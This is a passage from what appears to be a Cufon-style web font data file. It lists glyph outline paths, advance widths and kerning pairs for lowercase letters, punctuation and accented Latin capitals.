,13,17,82,31,123xm93,-165v0,-36,-3,-59,-39,-51r0,77v23,1,39,1,39,-26","w":144,"k":{"v":1,"V":1,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"s":{"d":"9,-192v0,-40,20,-63,59,-63v42,0,60,27,58,73r-37,0v11,-39,-40,-54,-40,-12v0,52,77,62,77,134v0,40,-20,63,-59,63v-46,1,-63,-31,-59,-81r38,0v-1,22,-1,45,20,45v13,0,21,-7,21,-25v0,-52,-78,-62,-78,-134","w":134,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":3,"X":3,".":2,",":2,"Y":3,"\u00dd":3,"\u0176":3,"\u0178":3,"\u1ef2":3,"y":3,"\u00fd":3,"\u00ff":3,"\u0177":3,"\u1ef3":3,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"t":{"d":"4,-216r0,-36r122,0r0,36r-41,0r0,216r-40,0r0,-216r-41,0","w":129,"k":{"\u2026":22,"\u201e":22,"\u201a":22,"}":-3,"]":-3,";":13,":":13,".":22,",":22,")":-3,"-":12,"\u00ad":12,"A":14,"\u00c0":14,"\u00c1":14,"\u00c2":14,"\u00c3":14,"\u00c4":14,"\u00c5":14,"\u0100":14,"\u0102":14,"\u0104":14,"\u00c6":18,"\u01fc":18,"a":14,"\u00e0":14,"\u00e1":14,"\u00e2":14,"\u00e3":14,"\u00e4":14,"\u00e5":14,"\u0101":14,"\u0103":14,"\u0105":14,"\u00e6":18,"\u01fd":18,"J":11,"\u0132":11,"\u0134":11,"j":11,"\u0133":11,"\u0135":11,"\u0237":11}},"u":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"v":{"d":"44,-252r30,206r30,-206r37,0r-39,252r-59,0r-39,-252r40,0","w":144,"k":{"\u0237":9,"\u01fd":17,"\u01fc":17,"\u0135":9,"\u0134":9,"\u0133":9,"\u0132":9,"\u0105":9,"\u0104":9,"\u0103":9,"\u0102":9,"\u0101":9,"\u0100":9,"\u00e6":17,"\u00e5":9,"\u00e4":9,"\u00e3":9,"\u00e2":9,"\u00e1":9,"\u00e0":9,"\u00c6":17,"\u00c5":9,"\u00c4":9,"\u00c3":9,"\u00c2":9,"\u00c1":9,"\u00c0":9,"\u00ad":4,"j":9,"a":9,"J":9,"A":9,"-":4,"\u2026":22,"\u201e":22,"\u201a":22,"}":-1,"]":-1,".":22,",":22,")":-1}},"w":{"d":"117,0r-15,-134r-14,134r-55,0r-28,-252r39,0r21,199r19,-199r38,0r20,200r21,-200r34,0r-28,252r-52,0","w":202,"k":{"\u2026":14,"\u201e":14,"\u201a":14,"}":-1,"]":-1,".":14,",":14,")":-1,"-":1,"\u00ad":1,"A":5,"\u00c0":5,"\u00c1":5,"\u00c2":5,"\u00c3":5,"\u00c4":5,"\u00c5":5,"\u0100":5,"\u0102":5,"\u0104":5,"\u00c6":9,"\u01fc":9,"a":5,"\u00e0":5,"\u00e1":5,"\u00e2":5,"\u00e3":5,"\u00e4":5,"\u00e5":5,"\u0101":5,"\u0103":5,"\u0105":5,"\u00e6":9,"\u01fd":9,"J":5,"\u0132":5,"\u0134":5,"j":5,"\u0133":5,"\u0135":5,"\u0237":5}},"x":{"d":"110,-252r37,0r-42,122r44,130r-41,0r-33,-100r-33,100r-37,0r45,-130r-42,-122r41,0r30,93","w":154,"k":{"\u1e61":3,"\u1e60":3,"\u0219":3,"\u0218":3,"\u01ff":5,"\u01fe":5,"\u0161":3,"\u0160":3,"\u015f":3,"\u015e":3,"\u015d":3,"\u015c":3,"\u015b":3,"\u015a":3,"\u0151":5,"\u0150":5,"\u014f":5,"\u014e":5,"\u014d":5,"\u014c":5,"\u0123":5,"\u0122":5,"\u0121":5,"\u0120":5,"\u011f":5,"\u011e":5,"\u011d":5,"\u011c":5,"\u010d":5,"\u010c":5,"\u010b":5,"\u010a":5,"\u0109":5,"\u0108":5,"\u0107":5,"\u0106":5,"\u00f8":5,"\u00f6":5,"\u00f5":5,"\u00f4":5,"\u00f3":5,"\u00f2":5,"\u00e7":5,"\u00df":3,"\u00d8":5,"\u00d6":5,"\u00d5":5,"\u00d4":5,"\u00d3":5,"\u00d2":5,"\u00c7":5,"\u00ad":5,"s":3,"o":5,"g":5,"c":5,"S":3,"O":5,"G":5,"C":5,"-":5,"\u201d":1,"\u201c":1,"\u2019":1,"\u2018":1,"\u0153":5,"\u0152":5,"q":5,"Q":5}},"y":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3":5,"\u00f4":5,"\u00f5":5,"\u00f6":5,"\u00f8":5,"\u014d":5,"\u014f":5,"\u0151":5,"\u01ff":5,"A":18,"\u00c0":18,"\u00c1":18,"\u00c2":18,"\u00c3":18,"\u00c4":18,"\u00c5":18,"\u0100":18,"\u0102":18,"\u0104":18,"\u00c6":23,"\u01fc":23,"a":18,"\u00e0":18,"\u00e1":18,"\u00e2":18,"\u00e3":18,"\u00e4":18,"\u00e5":18,"\u0101":18,"\u0103":18,"\u0105":18,"\u00e6":23,"\u01fd":23,"J":13,"\u0132":13,"\u0134":13,"j":13,"\u0133":13,"\u0135":13,"\u0237":13,"S":3,"\u015a":3,"\u015c":3,"\u015e":3,"\u0160":3,"\u0218":3,"\u1e60":3,"s":3,"\u00df":3,"\u015b":3,"\u015d":3,"\u015f":3,"\u0161":3,"\u0219":3,"\u1e61":3}},"z":{"d":"12,-252r112,0r0,35r-75,181r75,0r0,36r-116,0r0,-35r76,-181r-72,0r0,-36","w":133,"k":{"-":5,"\u00ad":5}},"{":{"d":"37,-126v30,9,22,37,25,68v2,23,7,27,25,26r0,32v-35,3,-55,-5,-60,-40v-4,-25,8,-72,-23,-70r0,-32v31,2,19,-45,23,-70v5,-35,25,-43,60,-40r0,32v-50,-6,-2,83,-50,94","w":92,"k":{"\u1ef3":-2,"\u1ef2":-2,"\u1e85":-1,"\u1e84":-1,"\u1e83":-1,"\u1e82":-1,"\u1e81":-1,"\u1e80":-1,"\u1e6b":-3,"\u1e6a":-3,"\u021b":-3,"\u021a":-3,"\u0178":-2,"\u0177":-2,"\u0176":-2,"\u0175":-1,"\u0174":-1,"\u0167":-3,"\u0166":-3,"\u0165":-3,"\u0164":-3,"\u0163":-3,"\u0162":-3,"\u00ff":-2,"\u00fd":-2,"\u00dd":-2,"y":-2,"w":-1,"t":-3,"Y":-2,"W":-1,"T":-3,"v":-1,"V":-1}},"|":{"d":"76,23r0,-298r32,0r0,298r-32,0","w":180},"}":{"d":"56,-126v-30,-9,-23,-36,-25,-68v-1,-23,-7,-27,-25,-26r0,-32v35,-3,55,5,60,40v4,25,-8,72,23,70r0,32v-31,-2,-19,45,-23,70v-5,35,-25,43,-60,40r0,-32v50,7,1,-84,50,-94","w":92},"~":{"d":"22,-102r-19,-18v28,-54,60,-23,94,-10v8,0,13,-5,24,-20r19,19v-29,54,-61,21,-95,9v-8,0,-12,5,-23,20"},"\u00a0":{"w":55},"\u00a1":{"d":"19,-196r30,0r5,91r0,105r-40,0r0,-105xm53,-214r-38,0r0,-38r38,0r0,38","w":68},"\u00a2":{"d":"55,5r0,-18v-59,-9,-42,-99,-42,-164v0,-34,14,-56,42,-62r0,-18r32,0r0,18v34,6,47,35,44,79r-37,0v1,-22,0,-44,-21,-44v-13,0,-20,6,-20,24r0,108v0,18,7,24,20,24v24,0,22,-29,21,-53r37,0v3,46,-6,83,-44,88r0,18r-32,0"},"\u00a3":{"d":"16,-76r0,-30r24,0v-9,-25,-26,-42,-26,-86v0,-40,20,-63,59,-63v48,-1,62,36,58,88r-37,0v0,-23,3,-52,-20,-52v-13,0,-20,7,-20,25v0,45,17,61,24,88r44,0r0,30r-41,0v-2,18,-10,31,-21,40r69,0r0,36r-118,0r0,-35v19,0,33,-15,34,-41r-29,0"},"\u00a5":{"d":"102,-252r38,0r-46,154r30,0r0,20r-33,0r0,16r33,0r0,20r-33,0r0,42r-40,0r0,-42r-32,0r0,-20r32,0r0,-16r-32,0r0,-20r29,0r-45,-154r41,0r29,111"},"\u00a6":{"d":"76,-148r0,-127r32,0r0,127r-32,0xm76,23r0,-127r32,0r0,127r-32,0","w":180},"\u00a7":{"d":"13,-113v0,-18,7,-35,24,-44v-39,-22,-31,-103,34,-98v44,3,61,22,58,62r-37,0v1,-17,-4,-29,-20,-29v-13,0,-20,7,-20,20v0,30,78,20,78,86v0,18,-9,36,-26,45v41,21,33,101,-33,97v-46,-3,-62,-24,-58,-67r37,0v-11,36,40,49,40,14v0,-30,-77,-20,-77,-86xm50,-114v0,14,10,21,22,27v12,-2,20,-14,20,-27v0,-14,-10,-21,-23,-27v-12,2,-19,14,-19,27"},"\u00a8":{"d":"-2,-301r37,0r0,37r-37,0r0,-37xm55,-301r37,0r0,37r-37,0r0,-37","w":90},"\u00a9":{"d":"146,-111r26,0v3,37,-6,64,-41,64v-53,0,-39,-64,-41,-114v0,-29,14,-44,41,-44v32,-1,44,22,41,57r-26,0v1,-15,1,-32,-14,-32v-9,0,-14,4,-14,17r0,74v0,13,5,17,14,17v17,0,14,-22,14,-39xm7,-126v0,-75,54,-129,125,-129v71,0,126,54,126,129v0,75,-55,129,-126,129v-71,0,-125,-54,-125,-129xm33,-126v0,60,42,104,99,104v57,0,100,-44,100,-104v0,-60,-43,-104,-100,-104v-57,0,-99,44,-99,104","w":264},"\u00aa":{"d":"11,-154v0,-35,20,-46,51,-47v0,-13,2,-31,-10,-30v-11,-2,-13,11,-12,24r-24,0v-2,-29,9,-47,37,-47v55,0,28,85,34,134r-21,0r-2,-17v-10,31,-53,23,-53,-17xm11,-103r76,0r0,25r-76,0r0,-25xm62,-182v-23,2,-26,12,-26,25v0,21,26,22,26,3r0,-28","w":100},"\u00ab":{"d":"28,-219r36,0r-22,93r22,98r-36,0r-22,-98xm86,-219r36,0r-22,93r22,98r-36,0r-22,-98","w":127},"\u00ac":{"d":"9,-140r125,0r0,77r-29,0r0,-49r-96,0r0,-28"},"\u00ad":{"d":"13,-108r0,-36r72,0r0,36r-72,0","w":97,"k":{"x":5,"v":4,"X":5,"V":4,"T":12,"\u0162":12,"\u0164":12,"\u0166":12,"\u021a":12,"\u1e6a":12,"W":1,"\u0174":1,"\u1e80":1,"\u1e82":1,"\u1e84":1,"Y":6,"\u00dd":6,"\u0176":6,"\u0178":6,"\u1ef2":6,"t":12,"\u0163":12,"\u0165":12,"\u0167":12,"\u021b":12,"\u1e6b":12,"w":1,"\u0175":1,"\u1e81":1,"\u1e83":1,"\u1e85":1,"y":6,"\u00fd":6,"\u00ff":6,"\u0177":6,"\u1ef3":6,"A":4,"\u00c0":4,"\u00c1":4,"\u00c2":4,"\u00c3":4,"\u00c4":4,"\u00c5":4,"\u0100":4,"\u0102":4,"\u0104":4,"a":4,"\u00e0":4,"\u00e1":4,"\u00e2":4,"\u00e3":4,"\u00e4":4,"\u00e5":4,"\u0101":4,"\u0103":4,"\u0105":4,"Z":4,"\u0179":4,"\u017b":4,"\u017d":4,"z":4,"\u017a":4,"\u017c":4,"\u017e":4}},"\u00ae":{"d":"7,-126v0,-75,54,-129,125,-129v71,0,126,54,126,129v0,75,-55,129,-126,129v-71,0,-125,-54,-125,-129xm33,-126v0,60,42,104,99,104v57,0,100,-44,100,-104v0,-60,-43,-104,-100,-104v-57,0,-99,44,-99,104xm179,-49r-29,0v-7,-17,12,-72,-30,-60r0,60r-27,0r0,-154v43,-1,82,-5,82,44v0,18,-5,29,-18,35v27,8,12,51,22,75xm148,-153v1,-22,-8,-27,-28,-25r0,43v16,0,27,1,28,-18","w":264},"\u00af":{"d":"1,-296r88,0r0,30r-88,0r0,-30","w":90},"\u00b0":{"d":"5,-219v0,-20,16,-36,36,-36v20,0,36,16,36,36v0,20,-16,35,-36,35v-20,0,-36,-15,-36,-35xm23,-219v0,10,8,17,18,17v10,0,18,-7,18,-17v0,-10,-8,-18,-18,-18v-10,0,-18,8,-18,18","w":82},"\u00b1":{"d":"85,-189r0,49r49,0r0,28r-49,0r0,49r-28,0r0,-49r-48,0r0,-28r48,0r0,-49r28,0"},"\u00b2":{"d":"65,-213v1,-24,-27,-25,-26,-3r0,17r-24,0v-3,-33,7,-56,38,-55v25,0,37,14,37,40v0,53,-55,70,-50,98r48,0r0,23r-73,0v-9,-63,47,-69,50,-120","w":100},"\u00b3":{"d":"50,-113v12,3,13,-16,13,-31v0,-19,-9,-21,-25,-20r0,-22v19,3,25,-5,25,-27v0,-14,-5,-18,-13,-18v-12,-1,-14,12,-13,26r-24,0v-2,-30,9,-49,37,-49v42,0,51,64,20,77v31,14,25,87,-20,87v-30,0,-39,-22,-37,-54r24,0v-1,15,-1,33,13,31","w":100},"\u00b4":{"d":"37,-306r41,0r-38,42r-28,0","w":90},"\u00b6":{"d":"128,-252r0,275r-29,0r0,-246r-19,0r0,246r-29,0r1,-118v-41,1,-47,-46,-47,-95v0,-67,59,-65,123,-62"},"\u00b7":{"d":"14,-145r39,0r0,38r-39,0r0,-38","w":66},"\u00b8":{"d":"44,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-31r18,0r0,19v14,0,23,8,23,21v0,22,-15,29,-33,29","w":90},"\u00b9":{"d":"23,-214r0,-18v19,0,24,-9,28,-20r17,0r0,160r-25,0r0,-122r-20,0","w":100},"\u00ba":{"d":"50,-231v-24,2,-13,50,-13,74v0,12,5,16,13,16v24,-2,13,-50,13,-74v0,-12,-5,-16,-13,-16xm50,-118v-47,0,-38,-52,-38,-96v0,-25,13,-40,38,-40v47,0,39,51,39,96v0,25,-14,40,-39,40xm12,-103r77,0r0,25r-77,0r0,-25","w":100},"\u00bb":{"d":"64,-219r36,0r22,93r-22,98r-36,0r22,-98xm6,-219r35,0r23,93r-23,98r-35,0r22,-98","w":127},"\u00bc":{"d":"23,-214r0,-18v19,0,24,-9,28,-20r17,0r0,160r-25,0r0,-122r-20,0xm58,0r99,-252r23,0r-99,252r-23,0xm134,-28r0,-23r45,-108r28,0r0,108r12,0r0,23r-12,0r0,29r-25,0r0,-29r-48,0xm156,-51r26,0r0,-59","w":225},"\u00bd":{"d":"23,-214r0,-18v19,0,24,-9,28,-20r17,0r0,160r-25,0r0,-122r-20,0xm47,0r99,-252r24,0r-100,252r-23,0xm190,-120v0,-14,-5,-18,-13,-18v-14,0,-14,18,-13,33r-24,0v-2,-33,6,-57,37,-56v25,0,38,14,38,40v0,53,-55,71,-50,99r48,0r0,22r-73,0v-9,-63,48,-69,50,-120","w":225},"\u00be":{"d":"50,-113v12,3,13,-16,13,-31v0,-19,-9,-21,-25,-20r0,-22v19,3,25,-5,25,-27v0,-14,-5,-18,-13,-18v-12,-1,-14,12,-13,26r-24,0v-2,-30,9,-49,37,-49v42,0,51,64,20,77v31,14,25,87,-20,87v-30,0,-39,-22,-37,-54r24,0v-1,15,-1,33,13,31xm61,0r100,-252r23,0r-99,252r-24,0xm134,-28r0,-23r45,-108r28,0r0,108r12,0r0,23r-12,0r0,29r-25,0r0,-29r-48,0xm156,-51r26,0r0,-59","w":225},"\u00bf":{"d":"51,-196r35,0v15,62,-42,72,-41,138v0,18,7,25,20,25v23,0,20,-29,20,-52r37,0v4,52,-9,89,-58,88v-39,0,-58,-23,-58,-63v0,-72,57,-78,45,-136xm88,-214r-38,0r0,-38r38,0r0,38","w":129,"k":{"\u1ef3":11,"\u1ef2":11,"\u1e85":7,"\u1e84":7,"\u1e83":7,"\u1e82":7,"\u1e81":7,"\u1e80":7,"\u1e6b":15,"\u1e6a":15,"\u021b":15,"\u021a":15,"\u0178":11,"\u0177":11,"\u0176":11,"\u0175":7,"\u0174":7,"\u0167":15,"\u0166":15,"\u0165":15,"\u0164":15,"\u0163":15,"\u0162":15,"\u00ff":11,"\u00fd":11,"\u00dd":11,"y":11,"w":7,"t":15,"Y":11,"W":7,"T":15,"v":11,"V":11}},"\u00c0":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm24,-306r43,0r26,42r-30,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c1":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm80,-306r41,0r-39,42r-28,0","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c2":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm57,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c3":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm107,-305r20,15v-17,39,-45,23,-72,16v-7,0,-10,3,-15,12r-21,-15v17,-38,45,-24,72,-16v7,0,11,-3,16,-12","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c4":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm26,-301r37,0r0,37r-37,0r0,-37xm84,-301r36,0r0,37r-36,0r0,-37","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c5":{"d":"102,-252r41,252r-40,0r-7,-46r-49,0r-7,46r-36,0r40,-252r58,0xm71,-207r-19,127r38,0xm43,-293v0,-17,13,-30,30,-30v17,0,30,13,30,30v0,17,-13,30,-30,30v-17,0,-30,-13,-30,-30xm73,-305v-15,0,-13,23,0,23v6,0,12,-5,12,-11v0,-6,-6,-12,-12,-12","w":146,"k":{"\u201d":22,"\u201c":22,"\u2019":22,"\u2018":22,"v":9,"V":9,"?":11}},"\u00c6":{"d":"91,0r0,-46r-40,0r-12,46r-38,0r68,-252r130,0r0,36r-69,0r0,70r55,0r0,36r-55,0r0,74r69,0r0,36r-108,0xm60,-80r31,0r0,-121","w":208},"\u00c7":{"d":"68,64v-17,0,-32,-9,-31,-28r23,0v-1,7,3,10,8,10v6,0,9,-4,9,-10v1,-8,-7,-11,-17,-10r0,-24v-75,-5,-49,-120,-49,-194v0,-40,20,-63,59,-63v48,-1,63,35,59,88r-37,0v1,-24,2,-52,-21,-52v-13,0,-20,7,-20,25r0,136v0,18,7,25,20,25v26,0,21,-36,21,-61r37,0v3,52,-6,95,-51,97r0,11v14,0,23,8,23,21v0,22,-15,29,-33,29","w":138,"k":{"\u2026":2,"\u201e":2,"\u201d":2,"\u201c":2,"\u201a":2,"\u2019":2,"\u2018":2,"x":4,"X":4,".":2,",":2,"Y":4,"\u00dd":4,"\u0176":4,"\u0178":4,"\u1ef2":4,"y":4,"\u00fd":4,"\u00ff":4,"\u0177":4,"\u1ef3":4}},"\u00c8":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm19,-306r43,0r26,42r-30,0","w":132},"\u00c9":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm75,-306r41,0r-39,42r-28,0","w":132},"\u00ca":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm51,-264r-36,0r34,-42r38,0r33,42r-35,0r-17,-21","w":132},"\u00cb":{"d":"54,-216r0,70r54,0r0,36r-54,0r0,74r68,0r0,36r-108,0r0,-252r108,0r0,36r-68,0xm21,-301r37,0r0,37r-37,0r0,-37xm78,-301r37,0r0,37r-37,0r0,-37","w":132},"\u00cc":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-14,-306r42,0r26,42r-30,0","w":68},"\u00cd":{"d":"14,0r0,-252r40,0r0,252r-40,0xm41,-306r41,0r-39,42r-28,0","w":68},"\u00ce":{"d":"14,0r0,-252r40,0r0,252r-40,0xm18,-264r-36,0r33,-42r38,0r34,42r-36,0r-17,-21","w":68},"\u00cf":{"d":"14,0r0,-252r40,0r0,252r-40,0xm-13,-301r37,0r0,37r-37,0r0,-37xm45,-301r36,0r0,37r-36,0r0,-37","w":68},"\u00d0":{"d":"14,0r0,-110r-13,0r0,-32r13,0r0,-110v64,-2,127,-5,122,62v-6,77,28,194,-59,190r-63,0xm96,-192v1,-28,-18,-24,-42,-24r0,74r24,0r0,32r-24,0r0,74v23,0,42,4,42,-24r0,-132","w":146,"k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d1":{"d":"99,0r-49,-183r0,183r-36,0r0,-252r50,0r40,151r0,-151r36,0r0,252r-41,0xm110,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","w":153},"\u00d2":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm22,-306r43,0r26,42r-30,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d3":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm78,-306r41,0r-39,42r-28,0","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d4":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm54,-264r-35,0r33,-42r38,0r33,42r-35,0r-17,-21","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d5":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm105,-305r20,15v-17,39,-44,23,-71,16v-7,0,-11,3,-16,12r-20,-15v17,-39,44,-23,71,-16v7,0,11,-3,16,-12","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d6":{"d":"51,-194r0,136v0,18,7,25,20,25v13,0,21,-7,21,-25r0,-136v0,-18,-8,-25,-21,-25v-13,0,-20,7,-20,25xm71,3v-87,0,-60,-117,-60,-195v0,-40,21,-63,60,-63v87,0,60,117,60,195v0,40,-21,63,-60,63xm24,-301r37,0r0,37r-37,0r0,-37xm82,-301r36,0r0,37r-36,0r0,-37","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d7":{"d":"33,-183r38,38r38,-38r20,19r-39,38r39,38r-20,19r-38,-38r-38,38r-19,-19r38,-38r-38,-38"},"\u00d8":{"d":"15,9r9,-26v-25,-38,-8,-117,-13,-175v-5,-55,53,-77,96,-54r7,-19r14,4r-10,26v26,37,8,117,13,175v5,55,-53,77,-96,54r-7,19xm51,-194r0,104r40,-112v-6,-24,-40,-24,-40,8xm51,-50v5,25,41,24,41,-8r0,-104","k":{"\u2026":4,"\u201e":4,"\u201d":4,"\u201c":4,"\u201a":4,"\u2019":4,"\u2018":4,"x":5,"X":5,".":4,",":4,"Y":5,"\u00dd":5,"\u0176":5,"\u0178":5,"\u1ef2":5,"y":5,"\u00fd":5,"\u00ff":5,"\u0177":5,"\u1ef3":5,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00d9":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm23,-306r43,0r26,42r-30,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00da":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm79,-306r41,0r-39,42r-28,0","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00db":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm55,-264r-35,0r33,-42r38,0r34,42r-36,0r-17,-21","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00dc":{"d":"13,-252r39,0r0,194v0,18,8,25,21,25v13,0,20,-7,20,-25r0,-194r38,0r0,192v0,40,-20,63,-59,63v-39,0,-59,-23,-59,-63r0,-192xm25,-301r37,0r0,37r-37,0r0,-37xm83,-301r37,0r0,37r-37,0r0,-37","w":143,"k":{"\u2026":2,"\u201e":2,"\u201a":2,".":2,",":2,"\u00c6":1,"\u01fc":1,"\u00e6":1,"\u01fd":1}},"\u00dd":{"d":"51,0r0,-84r-50,-168r42,0r30,115r30,-115r38,0r-50,168r0,84r-40,0xm80,-306r41,0r-39,42r-28,0","k":{"\u2026":29,"\u201e":29,"\u201a":29,"\u0153":5,"\u0152":5,"}":-2,"q":5,"]":-2,"Q":5,";":7,":":7,".":29,",":29,")":-2,"C":5,"\u00c7":5,"\u0106":5,"\u0108":5,"\u010a":5,"\u010c":5,"G":5,"\u011c":5,"\u011e":5,"\u0120":5,"\u0122":5,"O":5,"\u00d2":5,"\u00d3":5,"\u00d4":5,"\u00d5":5,"\u00d6":5,"\u00d8":5,"\u014c":5,"\u014e":5,"\u0150":5,"\u01fe":5,"-":6,"\u00ad":6,"c":5,"\u00e7":5,"\u0107":5,"\u0109":5,"\u010b":5,"\u010d":5,"g":5,"\u011d":5,"\u011f":5,"\u0121":5,"\u0123":5,"o":5,"\u00f2":5,"\u00f3